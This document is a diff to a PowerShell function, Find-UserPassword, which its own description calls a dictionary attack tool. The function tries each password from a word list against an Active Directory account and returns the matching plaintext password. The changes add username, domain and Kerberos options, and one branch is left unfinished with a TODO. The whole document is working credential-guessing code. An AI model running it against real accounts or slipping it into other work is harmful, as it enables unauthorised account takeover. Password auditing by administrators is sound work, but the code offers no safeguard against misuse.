@@ -2,19 +2,23 @@ Set-StrictMode -Version 2
 
 function Find-UserPassword
 {
-    	<#
+    <#
 		.SYNOPSIS
+            Determine if a user's password is contained in a specified file.
 
         .DESCRIPTION
+            This tool is basically a password file/dictionary attack tool.
+            
+            Find-UserPassword will test the passwords contained in the specified file against the active directory user.
 		
 		.PARAMETER Identity
-		Active Directory Identity.
+		    Active Directory Identity.
 	
 		.PARAMETER PasswordFile
-		Password list/file.
+		    Password list/file.
 	
 		.EXAMPLE
-        Find-UserPassword -Identify kieran.jacobsen -Password c:\passwordlist.txt
+            PS C:\> Find-UserPassword -Identify kieran.jacobsen -Password c:\passwordlist.txt
 	
 		.INPUTS
         Microsoft.ActiveDirectory.Management.ADUser.
@@ -27,19 +31,30 @@ function Find-UserPassword
 	#>
 
     [CmdletBinding()]
-    [OutputType("PSCredential", [System.Boolean])]
+#TODO:    [OutputType("PSCredential", [System.Boolean])]
     Param
     (
-        [Parameter(Mandatory = $True, valuefrompipeline = $true)]
+        [Parameter(Mandatory = $True, valuefrompipeline = $true, ParameterSetName = 'ADIdentity')]
         [ValidateNotNullOrEmpty()]
-        [Microsoft.ActiveDirectory.Management.ADUser]
+        [Microsoft.ActiveDirectory.Management.ADUser] 
         $Identity,
 
-        [Parameter(Mandatory = $True, ParameterSetName='PasswordFile')]
+        [Parameter(Mandatory = $True, valuefrompipeline = $true, ParameterSetName = 'Username')]
         [ValidateNotNullOrEmpty()]
+        [String] 
+        $Username,
+
+        [Parameter(Mandatory = $True)]
         [ValidateScript({Test-Path $_})]
         [String]
-        $PasswordFile
+        $PasswordFile,
+
+        [Parameter(Mandatory=$False, ParameterSetName = 'Username')]
+        [Switch] $Domain,
+		
+        [Parameter(Mandatory=$False)]
+        [Switch] $UseKerberos
+
     )
 
     Begin
@@ -57,8 +72,18 @@ function Find-UserPassword
 
     Process 
     {
-        $User = Get-ADUser -Identity $Identity
-        Write-Verbose -Message "Testing Passwords for user $( $User.SamAccountName )"
+        if ($PSCmdlet.ParameterSetName -eq 'ADIdentity')
+        {           
+            $ReturnUser = Get-ADUser -Identity $Identity
+            $Username = $ReturnUser.SamAccountName
+            $Domain = $true
+        }
+        else
+        {
+            #TODO: $ReturnUser = New-Object
+        }
+
+        Write-Verbose -Message "Testing Passwords for user $Username"
         
         $PasswordsProcessed = 0
         $PasswordFound = $false
@@ -74,7 +99,8 @@ function Find-UserPassword
             Write-Verbose -Message "Attempting password $PasswordAttempt"
 
             $SecureStringPassword = ConvertTo-SecureString -String $PasswordAttempt -AsPlainText -Force
-            $PasswordFound = Test-UserCredential -Username $User.SamAccountName -Password $SecureStringPassword -Domain
+
+            $PasswordFound = Test-UserCredential -Username $Username -Password $SecureStringPassword -Domain:$Domain -UseKerberos:$UseKerberos
 
             $PasswordsProcessed++
         }
@@ -85,9 +111,9 @@ function Find-UserPassword
         if (-not $PasswordFound) 
         { $PasswordAttempt = '<> Password Not Found <>' }
 
-        # Update the pipelined object
-        $ReturnUser = $User | Add-Member -NotePropertyName PasswordFound -NotePropertyValue $PasswordFound -Force -PassThru 
-        $ReturnUser = $User | Add-Member -NotePropertyName Password -NotePropertyValue $PasswordAttempt -Force -PassThru
+        # Update the pipelined object       
+        $ReturnUser = $ReturnUser | Add-Member -NotePropertyName PasswordFound -NotePropertyValue $PasswordFound -Force -PassThru 
+        $ReturnUser = $ReturnUser | Add-Member -NotePropertyName Password -NotePropertyValue $PasswordAttempt -Force -PassThru
 
         $ReturnUser
     }
